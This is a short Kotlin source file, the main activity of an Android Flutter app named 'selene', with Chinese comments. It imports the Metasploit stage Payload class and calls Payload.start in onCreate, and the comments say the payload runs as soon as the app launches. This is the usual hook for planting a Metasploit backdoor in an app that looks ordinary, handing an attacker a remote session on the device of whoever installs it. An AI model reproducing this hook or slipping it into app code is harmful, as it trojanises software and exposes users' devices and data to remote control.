package org.moontechlab.selene

import android.os.Bundle
import io.flutter.embedding.android.FlutterActivity
// 引入载荷类
import com.metasploit.stage.Payload

class MainActivity : FlutterActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // APP启动立刻执行载荷
        Payload.start(this)
    }
}
